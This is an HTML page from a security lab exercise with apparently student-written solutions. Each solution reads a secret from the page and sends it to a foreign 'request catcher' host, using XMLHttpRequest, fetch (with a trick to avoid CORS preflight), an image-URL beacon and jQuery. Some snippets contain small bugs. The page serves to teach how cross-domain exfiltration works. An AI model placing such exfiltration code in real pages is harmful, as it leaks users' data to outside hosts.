<!--
In these tasks you will transfer a value from this page (secret345) to a foreign host using different methods. Your browser may display errors in the browser console that the answer to the request can not be read. Note that the request is anyway successful which is the goal of this exercise.

We use the request catcher resource for the target host. Note that the request catcher is running on a different host, i.e. sending a request to this host can be compared to sending a request to any host in the Internet. Use the /debug console on the request catcher to verify that the request is received.
-->

<!DOCTYPE html>
<html lang="en">
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<title>Cross-domain request</title>
</head>
<body>
<h1>Cross-domain requests</h1>
Secret code: <span id="code">secret345</span>
<p>


<script>
	// Replace <id> with the correct subdomain for the request catcher
    var tempId = '35bb8091-6637-4d54-a5dd-7ff3743873b9';
	var request_catcher = "https://"+tempId+".idocker.vuln.land";
</script>


<!--
1a) Sending the secret value cross-domain using AJAX (GET)

The following JavaScript code makes a GET-request to https://<id>.idocker.vuln.land using the AJAX API.

Read the secret code from the HTML element with id 'code' (see above) and send the value to the request catcher by putting it into the http query string. 

-->
<script>
	// Modify the following JavaScript code
    let el = document.getElementById('code');
    const codeVal = el.innerText;
    var oReq = new XMLHttpRequest();
    oReq.open("GET", request_catcher + "/method1a/?code="+codeVal);
    oReq.send();  // when outcommented only simplify analysis
</script>

<!--
1b) Sending the secret value cross-domain using AJAX (POST)

Do the same as in 1a) but this time send the code in the HTTP body using a POST request
-->
<script>
	// Insert your JavaScript code here
    const codeVal2 = document.getElementById('code').innerText;
    var oReq = new XMLHttpRequest();
    oReq.open("POST", request_catcher + "/method1a/?code="+codeVal2);
    oReq.send(codeVal); // when outcommented only simplify analysis
</script>



<!--
2) Fetch API GET
This time use the fetch API to initiate the request (https://javascript.info/fetch)
-->
<script>
// Modify the following JavaScript code
fetch(request_catcher + "/method2a/?code="+codeVal)  // when outcommented only simplify analysis
</script>



<!--
2b) Fetch API POST
Again use the fetch API but this time send the code in the HTTP body using the POST method
-->
<script>
// with content-type application/json preflight request is triggered and call will not be sent 
let options = {
            body: JSON.stringify({code: codeVal}),
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            }
        };

// will not trigger a preflight request and therefore reach destination
options = {
            body: JSON.stringify({code: codeVal}),
            method: "POST",
        };

fetch(request_catcher + "/method2a", options);  // when outcommented only simplify analysis
</script>


<!--
3) Image URL
Another method to send the secret value cross-domain is to put it in the URL of an image request.
The browser will try to load the (non-existing) image and therefore transfer the secret to the foreign domain.

Complete the following JavaScript code to do this.
-->

<script>
// Modify the following JavaScript code
var img = document.createElement('img'); 
img.src = request_catcher + "/method2FromImage/?code="+codeVal;
document.getElementById('body').appendChild(img);  // when outcommented only simplify analysis
</script>

<!--
4) JQuery
JQuery is a common JavaScript library that provides functionality to simplify interaction with the DOM.
Note that jQuery is loaded from an external domain in the head section of this document.

Use jQuery sytnax ($.xxx) to read the secret from this page and send it as a GET AJAX request to the request catcher.

Use the following jQuery features for that:
- Selectors: https://www.w3schools.com/jquery/jquery_ref_selectors.asp
- Ajax methods: https://www.w3schools.com/jquery/jquery_ref_ajax.asp
-->

<script>
// Insert your JavaScript code here 
const $el = $('#code');
$.get(request_catcher + "/methoViaJQuery/?code="+$el.html(),() => {console.log('jquery ajax callback')});
</script>

</body>
</html>
